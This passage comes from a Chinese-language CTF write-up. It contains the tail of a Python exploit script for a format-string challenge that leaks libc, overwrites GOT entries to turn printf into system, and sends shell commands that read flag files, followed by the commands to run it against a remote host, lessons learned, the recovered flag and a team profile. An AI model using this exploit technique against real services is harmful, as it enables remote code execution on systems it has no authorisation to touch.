                m = re.search(rb"0x[0-9a-f]+", out)
                if not m:
                    raise RuntimeError("failed to leak libc pointer in stage1")

                leak = int(m.group(0), 16)
                libc_base = leak - READ_RET_OFF
                system_addr = libc_base + SYSTEM_OFF

                stage2 = build_stage2(system_addr)
                sock.sendall(stage2)
                out = recv_until(sock, b"Please checkin first\n", timeout=15.0)
                if b"Please checkin first\n" not in out:
                    raise RuntimeError("stage2 did not return to prompt")

                stage3 = (
                    b"echo "
                    + START_MARK
                    + b";"
                    + b"cat /flag 2>&1;"
                    + b"cat /flag.txt 2>&1;"
                    + b"cat flag 2>&1;"
                    + b"cat flag.txt 2>&1;"
                    + b"find / -maxdepth 3 -name 'flag*' -type f -exec cat {} \\; 2>&1;"
                    + b"echo "
                    + END_MARK
                    + b"\x00"
                )
                sock.sendall(stage3)
                return recv_until(sock, b"Please checkin first\n", timeout=10.0)
        except Exception as exc:
            last_err = exc
            print(f"[-] attempt {attempt} failed: {exc}", file=sys.stderr)
            time.sleep(1.0)

    raise RuntimeError(f"all attempts failed, last error: {last_err}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="114.66.24.221")
    parser.add_argument("--port", type=int, default=49831)
    args = parser.parse_args()

    out = exploit(args.host, args.port)

    start = out.find(START_MARK)
    end = out.find(END_MARK)
    view = out
    if start != -1 and end != -1 and end > start:
        view = out[start : end + len(END_MARK)]

    sys.stdout.buffer.write(view)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

---

#### 16. 复现步骤

##### 16.1 本地验证

```bash
/mnt/kali_share/checkin/attachment/ld-linux-x86-64.so.2 \
  --library-path /mnt/kali_share/checkin/attachment \
  /mnt/kali_share/checkin/attachment/pwn
```

##### 16.2 直接打远程

```bash
python3 /home/kali/agent/exploit.py --host 114.66.24.221 --port 32409
```

如果题目平台容器不稳定，可以多试几次；我在实战里也给脚本加了自动重连。

---

#### 17. 这题最值得记住的点

##### 17.1 “非栈上 fmt”不等于不能打

很多格式化字符串题的思维惯性太强，导致一看到 `.bss` 格式串就卡住。  
其实只要：

- 变参寄存器里还有残值
- 栈上还有可用槽位
- 能找到“某参数指向另一参数槽”的链

fmt 一样能打穿。

##### 17.2 `%n` 最强的地方不是直接写 GOT，而是“造指针”

本题里最关键的并不是一上来就写 GOT，  
而是先把：

- arg16
- arg18
- arg40

这些“未来参数槽”改造成我们想要的地址。  
一旦未来参数槽变成真实目标地址，后面的 `%hn` 就是顺手收割。

##### 17.3 多轮递归后，参数映射会变

这题如果只测第一轮布局，然后把同样的写法搬到第二轮，基本会崩。  
因为 `_exit -> main` 之后，栈深度已经变了。

所以：

- 第一轮参数图
- 第二轮参数图

必须分别测。

---

#### 18. 最终结论

这题本质是一道：

```text
非栈上格式化字符串 + 伪参数链改写 + 递归回环 + GOT 覆写
```

完整利用链是：

1. 第 1 轮利用 `arg8 -> arg16`
   - 泄 libc
   - 把 arg16 改成 `_exit@got`
   - 把 `_exit@got` 改成 `main`
2. 第 2 轮利用 `arg10 -> arg18`、`arg28 -> arg40`
   - 把 arg18 改成 `printf@got`
   - 把 arg40 改成 `printf@got+2`
   - 两次 `%hn` 把 `printf@got` 改成 `system`
3. 第 3 轮直接发送命令串
   - `printf(buf)` 实际变成 `system(buf)`
   - 直接输出 flag

最终 flag：

```text
flag{900d_W0rK_f0R_cH3ck1n!_574R7_Y0Ur_NC7F_pl33Z}
```



# 团队

## 名称

**PKFC**



## 口号

**暂无**



## 成员

### 队长

- **CQ_**

### 队员

- **k1neH**
- **F1iAz**
- **probie**



## 留言

### CQ_

- **暂无**

### k1neH

- **暂无**

### F1iAz

- **暂无**

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**